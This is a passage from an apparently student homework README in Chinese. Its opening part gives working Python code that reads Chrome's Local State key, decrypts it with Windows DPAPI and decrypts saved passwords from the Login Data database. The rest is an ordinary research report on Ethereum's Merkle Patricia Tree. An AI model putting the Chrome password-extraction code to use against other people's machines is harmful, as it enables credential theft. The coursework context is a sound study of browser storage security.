在主函数中，我们使用get_encryption_key()函数获取加密密钥，然后我们将 sqlite 数据库（位于"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\default\Login Data"保存密码的位置）复制到当前目录并连接到它，这是因为Chrome 当前正在运行，原始数据库文件将被锁定。之后，我们对登录表进行选择查询并遍历所有登录行，我们还解密每个密码date_created，完美提取Chrome浏览器保存的密码。最后，打印凭据并从当前目录中删除数据库副本。<br>
<br>
<br>
实验环境：<br>
处理器：11th Gen Intel(R) Core(TM) i5-11300H @ 3.10GHz<br>
内存：16GB LPDDR4<br>
操作系统：Win11<br>
编译器：python3.10(64-bit) <br>
代码语言：Python<br>
<br>

关键代码：<br>

```python
def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    en_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

    key=win32crypt.CryptUnprotectData(en_key[5:], None, None, None, 0)[1]
    return key

#解密password
def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""
```

运行结果：<br>
获得两个网站的密码的运行速度为0.03s<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/d6cdef8d-c61c-4686-92a8-4b5a29ff625a)

<br>
<br>
<br>
<br>
<br>
*Project22: research report on MPT<br>
<br>
一、MPT概述<br><br>
MPT(Merkel-Patricia Tree，梅克尔-帕特里夏树)，MPT提供了一个基于密码学验证的底层数据结构，是Ethereum用来存储区块数据的核心数据结构，用来存储键值对(key-value)关系。MPT是完全确定性的，这是指在一颗MPT上的一组键值对是唯一确定的，相同内容的键可以保证找到同样的值，并且有同样的根哈希( root hash)。MPT的插入、查找、删除操作的事件复杂度都是O(log(n))，相对于其它基于复杂比较的树结构(比如红黑树)，MPT更容易理解，也更易于编码实现。<br><br>


二、MPT的基础<br><br>
1、 字典树 Trie<br>
字典树（Trie）也称前缀树（prefix tree），是一种有序的树结构。其中的键通常是字符串。与二叉查找树不同，键不是直接保存在节点中，而是由节点在树中的位置决定。一个节点的所有子孙都有相同的前缀，也就是这个节点对应的字符串，而根节点对应空字符串。一般情况下，不是所有的节点都有对应的值，只有叶子节点和部分内部节点所对应的键才有相关的值。<br>
<br>
键标注在节点中，值标注在节点之下。每一个完整的英文单词对应一个特定的整数。键不需要被显式地保存在节点中。图示中标注出完整的单词，只是为了演示trie的原理。trie中的键通常是字符串，但也可以是其它的结构。<br>
<br>
实际上trie每个节点是一个确定长度的数组，数组中每个节点的值是一个指向子节点的指针，最后有个标志域，标识这个位置为止是否是一个完整的字符串，并且有几个这样的字符串。常见的用来存英文单词的trie每个节点是一个长度为27的指针数组，index0-25代表a-z字符，26为标志域。<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/3ae65e70-2bf1-46b0-bd57-a29b5a81628d)
<br>
<br>
字典树用于存储动态的集合或映射，其中的键通常是字符串，很多数据库的底层都采用的是树结构，以太坊最初的想法也是这样，但字典树还远远不够，主要问题是访问效率很低。<br>
<br>

2、 Patricia树<br>
 Patricia树，或称Patricia trie，或crit bit tree，压缩前缀树，是一种更节省空间的Trie。如果一个基数树的“基数”（radix）为2或2的整数次幂，就被称为“帕特里夏树”，有时也直接认为帕特里夏树就是基数树。<br>
<br>
以太坊中采用Hex字符作为key的字符集，也就是基数为16的基数树，每个节点最多可以有16个子节点，再加上value，所以共有17个“插槽”（slot）位置。<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/26c16307-b172-4658-8c30-bdeedef489ac)

<br>
<br>
帕特里夏树优化了访问效率，但还有一个问题没有解决。基数树节点之间的连接方式是指针，一般是用32位或64位的内存地址作为指针的值，比如C语言就是这么做的。但这种直接存地址的方式无法提供对数据内容的校验，而这在区块链这样的分布式系统中非常重要。<br>

<br>
<br>

3、Merkle树<br>
Merkle Tree，通常也被称作Hash Tree，顾名思义，就是存储hash值的一棵树。Merkle树的叶子是数据块(例如，文件或者文件的集合)的hash值。非叶节点是其对应子节点串联字符串的hash。<br>
<br>
梅克尔树就是最经典的解决数据校验的一种方式，用每个节点的hash值来建立对应的关系，底层的叶子节点都算一个hash，这是一个二叉树，两两hash之间再算一次hash，不断往上计算得出top hash算作一个根节点存到区块里面，去校验的时候，如果叶子节点发生改动，按照规则两两一hash计算得出的根节点会不一样，就知道数据发生了变动。<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/63eee6f6-a70c-421b-aa9b-69462fc09a8d)


<br>
梅克尔树可以实现数据校验，防止篡改。以太坊要去做hash的是整个要存储内容的RLP编码，所以以太坊相当于把自己的value先做RLP编码，然后再去求hash，然后把最后得到的hash值作为在数据库中存储的位置，所以在MPT中的节点里面用hash作为key，访问的的时候根据hash在数据库中找到对应的值。<br>
<br>

4、 MPT（Merkle Patricia Tree）树<br>
MPT（Merkle Patricia Tree）就是Merkle Tree和Patricia Tree这两者混合后的产物。<br>
<br>
相对于普通的前缀树，MPT树能有效减少Trie树的深度，增加Trie树的平衡性。而且通过节点的hash值进行树的节点的链接，有助于提高树的安全性和可验证性。<br>
<br>
三、MPT的基本结构<br>
1、 节点分类<br>
MPT树中的节点包括空节点、叶子节点、扩展节点和分支节点：<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/6af9df05-f6fd-4005-b9e0-433aa2e4ccc5)

<br>
<br>
·空节点（NULL）：简单的表示空，在代码中是一个空串。<br>
·叶子节点（leaf）：表示为[key,value]的一个键值对，其中key是key的一种特殊十六进制编码，value是value的RLP编码。<br>
·扩展节点（extension）：也是[key，value]的一个键值对，但是这里的value是其他节点的hash值，这个hash可以被用来查询数据库中的节点。也就是说通过hash链接到其他节点。<br>
·分支节点（branch）：因为MPT树中的key被编码成一种特殊的16进制的表示，再加上最后的value，所以分支节点是一个长度为17的list，前16个元素对应着key中的16个可能的十六进制字符，如果有一个[key,value]对在这个分支节点终止，最后一个元素代表一个值，即分支节点既可以搜索路径的终止也可以是路径的中间节点。<br>
<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/39c68581-2c34-468b-bb35-c46a8b6b9a24)

<br>
如图所示:<br>
MPT节点有不同的类型，先从上面开始看，最上面是根节点，是一个扩展结点，首先存一个压缩路径，然后存一个指向下一个节点的hash，把压缩路径的前缀单独领出来了，实际上是存储的时候是合在一起存的，他的前缀给的是0，因为后面的压缩起来的路径是偶数，偶数还是扩展结点，前缀的二进制表示就是0000，还要补0000，但是这里显示的只是前缀，没有显示补0的操作。<br>
<br>
 然后后面存一个hash指向下一个节点。下一个节点是一个分支节点，因为我们发现这个地方没法去压缩路径，因为他有不同的路径出现，所以就岔开了。分支节点里面1这个插槽对应的是一个叶子节点，前缀是2，因为他后面压缩的路径是偶数并且是叶子节点， 后面还有value，所以我们这里存的从根节点到分支节点，再到叶子节点。表示了一个什么键值对存储呢，他的key就是这个路径，从前面压缩出来的路径a7，然后往下走到1，然后1355，他的值是45eth，所以要存储的键是:a711355，值是45这样一个键值对，在MPT中就是这样组织存储。<br>
<br>
总共有2个扩展节点，2个分支节点，4个叶子节点。<br>
其中叶子结点的键值情况为：<br> 
![image](https://github.com/lemonade310/homework-group25/assets/139195261/699ca7e3-0348-4fac-8b09-c4c879bde3d3)

<br>
节点的前缀：<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/4e59ad09-d1b3-4de8-8347-d7acafb7cd55)

<br>  
<br>
2、 key值编码<br>
在以太坊中，MPT树的key值共有三种不同的编码方式，以满足不同场景的不同需求，三种编码方式分别为：<br>
·Raw编码（原生的字符）<br>
·Hex编码（扩展的16进制编码）<br>
·Hex-Prefix编码（16进制前缀编码）<br>
<br>
 ①Raw编码<br>
Raw编码就是原生的key值，不做任何改变。这种编码方式的key，是MPT对外提供接口的默认编码方式。<br>
<br>
例如一条key为“cat”，value为“dog”的数据项，其Raw编码就是['c', 'a', 't']，换成ASCII表示方式就是[63, 61, 74]<br>
<br>
 ②Hex编码<br>
为了减少分支节点孩子的个数，需要将key的编码进行转换，将原key的高低四位分拆成两个字节进行存储。这种转换后的key的编码方式，就是Hex编码。<br>
<br>
从Raw编码向Hex编码的转换规则是：<br>
将Raw编码的每个字符，根据高4位低4位拆成两个字节；<br>
若该Key对应的节点存储的是真实的数据项内容（即该节点是叶子节点），则在末位添加一个ASCII值为16的字符作为终止标志符；<br>
若该key对应的节点存储的是另外一个节点的哈希索引（即该节点是扩展节点），则不加任何字符；<br>
key为“cat”, value为“dog”的数据项，其Hex编码为[3, 15, 3, 13, 4, 10, 16]<br>
<br>
<br>
Hex编码用于对内存中MPT树节点key进行编码<br>
<br>
 ③HP编码<br>
叶子／扩展节点这两种节点定义是共享的，即便持久化到数据库中，存储的方式也是一致的。那么当节点加载到内存是，同样需要通过一种额外的机制来区分节点的类型。于是以太坊就提出了一种HP编码对存储在数据库中的叶子／扩展节点的key进行编码区分。在将这两类节点持久化到数据库之前，首先会对该节点的key做编码方式的转换，即从Hex编码转换成HP编码。<br>
<br>
HP编码的规则如下：<br>
若原key的末尾字节的值为16（即该节点是叶子节点），去掉该字节；<br>
在key之前增加一个半字节，其中最低位用来编码原本key长度的奇偶信息，key长度为奇数，则该位为1；低2位中编码一个特殊的终止标记符，若该节点为叶子节点，则该位为1；<br>
若原本key的长度为奇数，则在key之前再增加一个值为0x0的半字节；<br>
将原本key的内容作压缩，即将两个字符以高4位低4位进行划分，存储在一个字节中（Hex扩展的逆过程）；<br>
若Hex编码为[3, 15, 3, 13, 4, 10, 16]，则HP编码的值为[32, 63, 61, 74]<br>
<br>
HP编码用于对数据库中的树节点key进行编码<br>
<br>
 ④转换关系<br>
以上三种编码方式的转换关系为：<br>
Raw编码：原生的key编码，是MPT对外提供接口中使用的编码方式，当数据项被插入到树中时，Raw编码被转换成Hex编码；<br>
Hex编码：16进制扩展编码，用于对内存中树节点key进行编码，当树节点被持久化到数据库时，Hex编码被转换成HP编码；<br>
HP编码：16进制前缀编码，用于对数据库中树节点key进行编码，当树节点被加载到内存时，HP编码被转换成Hex编码；<br>
<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/c57fe5fe-780e-44a1-ad4d-f435cbf8b28a)

<br>

<br>
3、 安全的MPT<br>
以上介绍的MPT树，可以用来存储内容为任何长度的key-value数据项。倘若数据项的key长度没有限制时，当树中维护的数据量较大时，仍然会造成整棵树的深度变得越来越深，会造成以下影响：<br>
查询一个节点可能会需要许多次IO读取，效率低下；<br>
系统易遭受Dos攻击，攻击者可以通过在合约中存储特定的数据，“构造”一棵拥有一条很长路径的树，然后不断地调用SLOAD指令读取该树节点的内容，造成系统执行效率极度下降；<br>
所有的key其实是一种明文的形式进行存储；<br>
<br><br>
为了解决以上问题，在以太坊中对MPT再进行了一次封装，对数据项的key进行了一次哈希计算，因此最终作为参数传入到MPT接口的数据项其实是(sha3(key), value)。<br>
<br>
这样传入MPT接口的key是固定长度的（32字节），可以避免出现树中出现长度很长的路径；但是每次树操作需要增加一次哈希计算，并且需要在数据库中存储额外的sha3(key)与key之间的对应关系。<br>
<br>

四、MPT的功能——以太坊的轻节点扩展<br><br>
MPT能够提供的一个重要功能——默克尔证明，使用默克尔证明能够实现轻节点的扩展。<br>
<br>
1、轻节点<br>
在以太坊或比特币中，一个参与共识的全节点通常会维护整个区块链的数据，每个区块中的区块头信息，所有的交易，回执信息等。由于区块链的不可篡改性，这将导致随着时间的增加，整个区块链的数据体量会非常庞大。运行在个人PC或者移动终端的可能性显得微乎其微。为了解决这个问题，一种轻量级的，只存储区块头部信息的节点被提出。这种节点只需要维护链中所有的区块头信息（一个区块头的大小通常为几十个字节，普通的移动终端设备完全能够承受出）。<br>
<br>
在公链的环境下，仅仅通过本地所维护的区块头信息，轻节点就能够证明某一笔交易是否存在与区块链中；某一个账户是否存在与区块链中，其余额是多少等功能。<br>
<br>
2、默克尔证明<br>
默克尔证明指一个轻节点向一个全节点发起一次证明请求，询问全节点完整的默克尔树中，是否存在一个指定的节点；全节点向轻节点返回一个默克尔证明路径，由轻节点进行计算，验证存在性。<br>
<br>
3、默克尔证明过程<br>
如有棵如下图所示的merkle树，如果某个轻节点想要验证9Dog:64这个树节点是否存在与默克尔树中，只需要向全节点发送该请求，全节点会返回一个1FXq:18,ec20,8f74的一个路径（默克尔路径，如图2黄色框所表示的）。得到路径之后，轻节点利用9Dog:64与1FXq:18求哈希，在与ec20求哈希，最后与8f74求哈希，得到的结果与本地维护的根哈希相比，是否相等。<br>
![image](https://github.com/lemonade310/homework-group25/assets/139195261/48faa191-2ea2-4d16-8ac8-bdd5ef14f990)

<br>
<br>

<br>
4、默克尔证明安全性<br>
（1）若全节点返回的是一条恶意的路径？试图为一个不存在于区块链中的节点伪造一条合法的merkle路径，使得最终的计算结果与区块头中的默克尔根哈希相同。<br>
由于哈希的计算具有不可预测性，使得一个恶意的“全”节点想要为一条不存在的节点伪造一条“伪路径”使得最终计算的根哈希与轻节点所维护的根哈希相同是不可能的。<br>
<br>
（2）为什么不直接向全节点请求该节点是否存在于区块链中？<br>
由于在公链的环境中，无法判断请求的全节点是否为恶意节点，因此直接向某一个或者多个全节点请求得到的结果是无法得到保证的。但是轻节点本地维护的区块头信息，是经过工作量证明验证的，也就是经过共识一定正确的，若利用全节点提供的默克尔路径，与代验证的节点进行哈希计算，若最终结果与本地维护的区块头中根哈希一致，则能够证明该节点一定存在于默克尔树中。<br>
<br>
5、简单支付验证<br>
在以太坊中，利用默克尔证明在轻节点中实现简单支付验证，即在无需维护具体交易信息的前提下，证明某一笔交易是否存在于区块链中。<br>
<br>
五、MPT在以太坊中的应用<br><br>
1、存储账户和合约状态：以太坊使用MPT来存储账户和合约的状态。每个账户都有一个唯一的地址，而该地址对应的状态数据存储在MPT中。通过MPT的哈希树结构，可以快速检索和验证特定账户的状态。<br>
2、交易验证：以太坊的交易数据也使用MPT进行存储和验证。每个区块中的交易数据通过MPT的哈希树结构组织起来，其中每个叶节点存储着交易数据的哈希值。通过验证根节点的哈希值，可以确保交易数据的完整性和正确性。<br>
3、存储合约代码：在以太坊中，智能合约的代码也是存储在MPT中的。合约代码被存储在特殊的账户中，通过账户地址和MPT的索引，可以快速检索和获取合约代码。<br>
4、事件日志存储：以太坊中的智能合约可以通过事件日志记录重要的状态变化或交互信息。事件日志通过MPT进行存储，每个区块中的事件日志都被组织成一个MPT结构，便于查询和检索。<br>
<br>
综上所述，MPT在以太坊中不仅提供了高效的数据存储和检索能力，还确保了数据的完整性和可验证性。它在以太坊的区块链技术中扮演着重要的角色，支持以太坊的各种功能和特性的实现。<br>
